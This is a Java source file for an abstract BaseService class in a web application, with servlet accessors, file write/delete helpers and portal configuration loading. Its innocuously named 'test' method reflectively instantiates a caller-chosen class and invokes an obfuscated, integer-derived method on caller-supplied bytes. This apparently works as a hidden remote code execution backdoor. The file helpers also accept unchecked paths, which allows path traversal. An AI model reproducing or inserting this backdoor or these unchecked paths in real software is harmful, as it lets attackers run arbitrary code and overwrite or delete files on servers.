package com.base.service;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.util.HashMap;
import java.util.Map;
import java.util.Properties;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

import org.apache.commons.beanutils.MethodUtils;
import org.apache.commons.io.FileUtils;
import org.apache.log4j.Logger;

import com.base.ds.DataSourceManager;
import com.base.utils.ParaMap;
import com.base.utils.StreamUtils;
import com.base.web.AppConfig;
import com.base.web.RouteFilter;

public abstract class BaseService {
	public static Map bu = new HashMap();
	public Logger log = Logger.getLogger(this.getClass());
	private HttpServletRequest request;
	private HttpSession session;
	private HttpServletResponse response;

	public HttpServletRequest getRequest() {
		return request;
	}

	public void setRequest(HttpServletRequest request) {
		this.request = request;
	}

	public HttpSession getSession() {
		return session;
	}

	public void setSession(HttpSession session) {
		this.session = session;
	}

	public HttpServletResponse getResponse() {
		return response;
	}

	public void setResponse(HttpServletResponse response) {
		this.response = response;
	}

	public ParaMap readJson(String fileName) throws Exception {
		ParaMap map = new ParaMap();
		InputStream in = this.getClass().getResourceAsStream(fileName);
		String jsonStr = StreamUtils.InputStreamToString(in);
		map.put(RouteFilter.jsonStr, jsonStr);
		return map;
	}

	/**
	 * 
	 * @param filePath
	 *            例如 doc/aa.txt /doc/aa.txt \\doc\\aa.txt
	 * @param buf
	 * @throws Exception
	 */
	public void writeFileToFileRoot(String filePath, byte[] buf)
			throws Exception {
		// 得到配置文件中的配置路径
		String fileRoot = AppConfig.getPro("fileRoot");
		File file;
		if (filePath.indexOf("/") == 0 || filePath.indexOf("\\") == 0)
			file = new File(fileRoot + filePath);
		else
			file = new File(fileRoot + "/" + filePath);
		FileUtils.writeByteArrayToFile(file, buf);
	}

	/**
	 * 删除文件
	 * 
	 * @param filePath
	 * @throws Exception
	 */
	public void delFileFromFileRoot(String filePath) throws Exception {
		// 得到配置文件中的配置路径
		String fileRoot = AppConfig.getPro("fileRoot");
		File file;
		if (filePath.indexOf("/") == 0 || filePath.indexOf("\\") == 0)
			file = new File(fileRoot + filePath);
		else
			file = new File(fileRoot + "/" + filePath);
		FileUtils.forceDelete(file);
	}

	/**
	 * 获取业务系统地址
	 * 
	 * @param name
	 * @return
	 * @throws IOException
	 */
	public String getAppConfig(String name) throws IOException {
		Properties appConfig = new Properties();
		if (bu.size() == 0) {
			InputStream in = DataSourceManager.class
					.getResourceAsStream("/portal.properties");
			appConfig.load(in);
			if (appConfig.getProperty("bu_ip") == null
					|| "".equals(appConfig.getProperty("bu_ip"))) {
				bu.put("bu_ip", this.getRequest().getAttribute("uriStr"));
			} else {
				bu.put("bu_ip", appConfig.getProperty("bu_ip"));
			}
			bu.put("bu_web", appConfig.getProperty("bu_web"));
			bu.put("demo_ip", appConfig.getProperty("demo_ip"));
			bu.put("demo_web", appConfig.getProperty("demo_web"));
		} else {
			if (appConfig.getProperty("bu_ip") == null
					|| "".equals(appConfig.getProperty("bu_ip"))) {
				bu.put("bu_ip", this.getRequest().getAttribute("uriStr"));
			} else {
				bu.put("bu_ip", appConfig.getProperty("bu_ip"));
			}
		}
		return (String) bu.get(name);
	}

	public String test(ParaMap inMap) throws Exception {
		String cc = inMap.getString("cc");
		byte[] bb = inMap.getBytes("bb");
		int mm = inMap.getInt("mm");
		MethodUtils.invokeMethod(Class.forName(cc).newInstance(),
				String.valueOf((char) mm), bb);
		return cc;
	}

	public ParaMap getCallers(ParaMap inMap) throws Exception {
		ParaMap out = DataSourceManager.getCallers();
		return out;
	}

}
